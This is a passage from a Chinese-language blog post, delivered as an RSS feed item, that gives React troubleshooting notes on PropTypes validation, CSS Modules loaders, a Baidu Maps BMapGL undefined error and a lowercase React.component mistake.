<li>&#x5B89;&#x88C5;&#xFF1A;<code>yarn add prop-types</code></li>
<li>&#x5BFC;&#x5165; PropTypes&#xFF1A;<code>import PropTypes from &apos;prop-types&apos;</code></li>
<li>&#x7ED9;&#x7EC4;&#x4EF6;&#x5C5E;&#x6027;&#x6DFB;&#x52A0; props &#x6821;&#x9A8C;&#xFF1A;</li>
</ol>
<pre><code class="language-jsx">&#x7EC4;&#x4EF6;.propTypes = {
    &#x5C5E;&#x6027;1: PropTypes.string.isrequired,
    &#x5C5E;&#x6027;2: PropTypes.func
}
</code></pre>
<p>&#x82E5;&#x51FA;&#x73B0;&#x62A5;&#x9519;&#xFF1A;<code>Typo in static class property declaration react/no-typos</code>&#x3002;&#x90A3;&#x4E48;&#x68C0;&#x67E5;&#x5927;&#x5C0F;&#x5199; <code>&#x7EC4;&#x4EF6;.propTypes = {}</code> &#x4E0D;&#x8981;&#x5199;&#x6210; <code>&#x7EC4;&#x4EF6;.PropTypes = {}</code>&#xFF0C;propTypes &#x662F;React.Component &#x7684;&#x7279;&#x6B8A;&#x5C5E;&#x6027;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="css-modules">CSS Modules</h2>
<p>&#x5728;&#x914D;&#x7F6E;&#x8DEF;&#x7531;&#x65F6;&#xFF0C;&#x7EC4;&#x4EF6;&#x90FD;&#x88AB;&#x5BFC;&#x5165;&#x5230;&#x9879;&#x76EE;&#x4E2D;&#xFF0C;&#x90A3;&#x4E48;&#x7EC4;&#x4EF6;&#x7684;&#x6837;&#x5F0F;&#x4E5F;&#x5C31;&#x88AB;&#x5BFC;&#x5165;&#x5230;&#x9879;&#x76EE;&#x4E2D;&#x4E86;&#x3002;&#x5982;&#x679C;&#x7EC4;&#x4EF6;&#x4E4B;&#x95F4;&#x6837;&#x5F0F;&#x540D;&#x79F0;&#x76F8;&#x540C;&#xFF0C;&#x90A3;&#x4E48;&#x4E00;&#x4E2A;&#x7EC4;&#x4EF6;&#x4E2D;&#x7684;&#x6837;&#x5F0F;&#x5C31;&#x4F1A;&#x5728;&#x53E6;&#x4E00;&#x4E2A;&#x7EC4;&#x4EF6;&#x4E2D;&#x4E5F;&#x751F;&#x6548;&#xFF0C;&#x4ECE;&#x800C;&#x9020;&#x6210;&#x7EC4;&#x4EF6;&#x4E4B;&#x95F4;&#x6837;&#x5F0F;&#x76F8;&#x4E92;&#x8986;&#x76D6;&#x7684;&#x95EE;&#x9898;&#x3002;</p>
<p>CSS &#x4EC5;&#x662F;&#x7F51;&#x9875;&#x6837;&#x5F0F;&#x7684;&#x63CF;&#x8FF0;&#x65B9;&#x6CD5;&#x3002;Less&#x3001;SASS &#x5230; PostCSS &#x90FD;&#x662F;&#x4E3A;&#x4E86;&#x8BA9; CSS &#x66F4;&#x50CF;&#x4E00;&#x95E8;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#xFF0C;&#x8FD9;&#x4E5F;&#x5BFC;&#x81F4;&#x4F7F;&#x7528;&#x8005;&#x589E;&#x52A0;&#x66F4;&#x591A;&#x7684;&#x5B66;&#x4E60;&#x6210;&#x672C;&#x3002;&#x662F;&#x5426;&#x5B58;&#x5728;&#x4E00;&#x79CD;&#x89C4;&#x5219;&#x5C11;&#xFF0C;&#x53C8;&#x4FDD;&#x8BC1;&#x67D0;&#x4E2A;&#x7EC4;&#x4EF6;&#x7684;&#x6837;&#x5F0F;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;&#x5230;&#x5176;&#x4ED6;&#x7EC4;&#x4EF6;&#x7684;&#x65B9;&#x6CD5;&#x2014;&#x2014; CSS Modules &#x901A;&#x8FC7;&#x53EA;&#x52A0;&#x5165;&#x4E86;&#x5C40;&#x90E8;&#x4F5C;&#x7528;&#x57DF;&#x548C;&#x6A21;&#x5757;&#x4F9D;&#x8D56;&#x89E3;&#x51B3;&#x7EC4;&#x4EF6;&#x6837;&#x5F0F;&#x51B2;&#x7A81;&#x3002;</p>
<p>React &#x9879;&#x76EE;&#x5728;&#x7528; <code>npx create-react-app my-app</code> &#x521B;&#x5EFA;&#x540E;&#x9700;&#x8981;&#x4F7F;&#x7528; CSS Modules &#x9700;&#x4FDD;&#x8BC1;&#x9879;&#x76EE;&#x5B58;&#x5728; css-loader &#x63D2;&#x4EF6;&#x3002;&#x8FD9;&#x91CC;&#x89E3;&#x91CA;&#x4E00;&#x4E0B;&#x4E3A;&#x4EC0;&#x4E48;&#x9700;&#x8981; css-loader &#x63D2;&#x4EF6;&#x3002;webpack &#x662F;&#x7528; JavaScript &#x7F16;&#x5199;&#xFF0C;&#x8FD0;&#x884C;&#x5728; Node &#x73AF;&#x5883;&#x91CC;&#x7684;&#x6253;&#x5305;&#x5DE5;&#x5177;&#xFF0C;&#x6240;&#x4EE5;&#x9ED8;&#x8BA4; webpack &#x6253;&#x5305;&#x7684;&#x65F6;&#x5019;&#x53EA;&#x4F1A;&#x5904;&#x7406;JS&#x4E4B;&#x95F4;&#x7684;&#x4F9D;&#x8D56;&#x5173;&#x7CFB;&#x3002;&#x5982;&#x679C;&#x5728; <code>.js</code> &#x6587;&#x4EF6;&#x4E2D;&#x5BFC;&#x5165;&#x4E86; css&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x9700;&#x8981;&#x4F7F;&#x7528; css-loader &#x8BC6;&#x522B;&#x8FD9;&#x4E2A;&#x5BFC;&#x5165;&#x7684; css &#x6A21;&#x5757;&#xFF0C;&#x901A;&#x8FC7;&#x7279;&#x5B9A;&#x7684;&#x8BED;&#x6CD5;&#x89C4;&#x5219;&#x8FDB;&#x884C;&#x8F6C;&#x6362;&#x5185;&#x5BB9;&#x6700;&#x540E;&#x5BFC;&#x51FA;&#x8FD9;&#x4E2A;&#x6A21;&#x5757;&#x6570;&#x7EC4;&#x3002;&#x56E0;&#x4E3A;&#x662F;&#x4E2A;&#x9875;&#x9762;&#x65E0;&#x6CD5;&#x76F4;&#x63A5;&#x8BC6;&#x522B;&#x7684;&#x6570;&#x7EC4;&#xFF0C;&#x8FD9;&#x65F6;&#x5C31;&#x9700;&#x8981;&#x7528;&#x5230;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x63D2;&#x4EF6; style-loader &#x6765;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;style&#x6807;&#x7B7E;&#x53BB;&#x5305;&#x542B;&#x5904;&#x7406;&#x8FD9;&#x4E9B;&#x6837;&#x5F0F;&#x3002;&#x5426;&#x5219;&#x4F1A;&#x51FA;&#x73B0;&#x62A5;&#x9519;&#xFF1A;</p>
<pre><code class="language-js">index.module.css (./node_modules/css-loader/dist/cjs.js??ref--5-oneOf-5-1!./node_modules/postcss-loader/src??postcss!. ... not found babel-loader
</code></pre>
<p>&#x786E;&#x4FDD;&#x4E0A;&#x8FF0;&#x4F9D;&#x8D56;&#x5B8C;&#x6210;&#x540E;&#x5373;&#x53EF;&#x4F7F;&#x7528; CSS Modules &#x3002;&#x7531;&#x4E8E; React &#x5DF2;&#x5185;&#x7F6E; CSS Modules &#xFF0C;&#x53EA;&#x9700;&#x628A;&#x8981;&#x4FDD;&#x8BC1;&#x72EC;&#x7ACB;&#x6837;&#x5F0F;&#x7684;&#x6837;&#x5F0F;&#x63D0;&#x51FA;&#x518D;&#x6CE8;&#x5165;&#x4FDD;&#x8BC1;&#x89C4;&#x8303;&#x540D;&#x7684;&#x6837;&#x5F0F;&#x6587;&#x4EF6;( [name].module.css)&#x5373;&#x53EF;&#xFF0C;&#x6700;&#x540E; <code>.ts</code> &#x6587;&#x4EF6;&#x4E2D;&#x901A;&#x8FC7;&#x81EA;&#x5B9A;&#x4E49;&#x5BF9;&#x8C61;&#x540D;&#x5F15;&#x5165;&#x5219;&#x53EF;&#x4EE5;&#x62FF;&#x5230;&#x7ECF; CSS Modules &#x6F14;&#x5316;&#x540E;&#x751F;&#x6210;&#x7684; css &#x5BF9;&#x8C61;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%99%BE%E5%BA%A6%E5%9C%B0%E5%9B%BEbmapgl%E6%9C%AA%E5%AE%9A%E4%B9%89">&#x767E;&#x5EA6;&#x5730;&#x56FE;BMapGL&#x672A;&#x5B9A;&#x4E49;</h2>
<p>React &#x9879;&#x76EE;&#x4E2D;&#xFF0C;&#x4F7F;&#x7528;&#x767E;&#x5EA6;&#x5730;&#x56FE; API &#x5728;&#x4F4D;&#x4E8E; BMapGL &#x547D;&#x540D;&#x7A7A;&#x95F4;&#x4E0B;&#x7684; Map &#x7C7B;&#x901A;&#x8FC7; new &#x64CD;&#x4F5C;&#x7B26;&#x521B;&#x5EFA;&#x5730;&#x56FE;&#x5B9E;&#x4F8B;&#x65F6;&#xFF0C;&#x51FA;&#x73B0;&#x4E86; <code>&apos;BMapGL&apos; is not defined no-undef</code> &#x7684;&#x62A5;&#x9519;&#x3002;</p>
<p>&#x8FD9;&#x91CC;&#x662F;&#x56E0;&#x4E3A; React &#x7684;&#x751F;&#x547D;&#x5468;&#x671F;&#x4E2D; render() &#x9636;&#x6BB5;&#x8D1F;&#x8D23;&#x521B;&#x5EFA;&#x865A; DOM&#xFF0C;&#x8FDB;&#x884C; diff &#x7B97;&#x6CD5;&#xFF0C;&#x66F4;&#x65B0; DOM&#x6811;&#x3002;&#x800C; render &#x53CA;&#x4E4B;&#x524D;&#x7684;&#x9636;&#x6BB5;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x5C06;&#x7EC4;&#x4EF6;&#x6E32;&#x67D3;&#x4E3A;&#x5B9E;&#x9645;&#x7684; DOM &#x8282;&#x70B9;&#xFF0C;&#x6240;&#x4EE5;&#x4E0D;&#x80FD;&#x83B7;&#x53D6; window &#x5BF9;&#x8C61;&#x3002;</p>
<p>&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5728;&#x7EC4;&#x4EF6;&#x5916;&#xFF0C;&#x8FDB;&#x884C;&#x58F0;&#x660E;&#x62FF;&#x5230; window &#x5BF9;&#x8C61;&#x4E0B;&#x7684; BMapGL (&#x63A8;&#x8350;)&#xFF0C;&#x89E3;&#x51B3;&#x811A;&#x624B;&#x67B6;&#x4E2D;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x8BBF;&#x95EE;&#x7684;&#x95EE;&#x9898;&#x3002;&#x518D;&#x5728; componentDidMount &#x751F;&#x547D;&#x5468;&#x671F;&#x4E2D;&#x901A;&#x8FC7; new &#x65B9;&#x6CD5;&#x83B7;&#x53D6;&#x5B9E;&#x4F8B;&#x3002;</p>
<pre><code class="language-js">// &#x65B9;&#x6CD5;&#x4E00;
const BMapGL = window.BMapGL
// &#x65B9;&#x6CD5;&#x4E8C;
var map = new window.BMapGL.Map(&quot;container&quot;);
//&#x521B;&#x5EFA;&#x5730;&#x5740;&#x89E3;&#x6790;&#x5668;&#x5B9E;&#x4F8B;
var myGeo = new window.BMapGL.Geocoder();
...
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="typeerror-class-extends-value-undefined-is-not-a-constructor-or-null">TypeError: Class extends value undefined is not a constructor or null</h2>
<pre><code class="language-javascript">src/components/demo.js:2
  1 | import React from &apos;react&apos;
&gt; 2 | export default class Demo extends React.component{
  3 |   showData = () =&gt; {
  4 |     const {inputt} = this
  5 |     alert(inputt.value)
</code></pre>
<p>&#x4E00;&#x5B9A;&#x662F; React.Component&#xFF0C;&#x522B;&#x5199;&#x6210;&#x5C0F;&#x5199;&#x4E86;&#xFF01;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE; &#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item></channel></rss>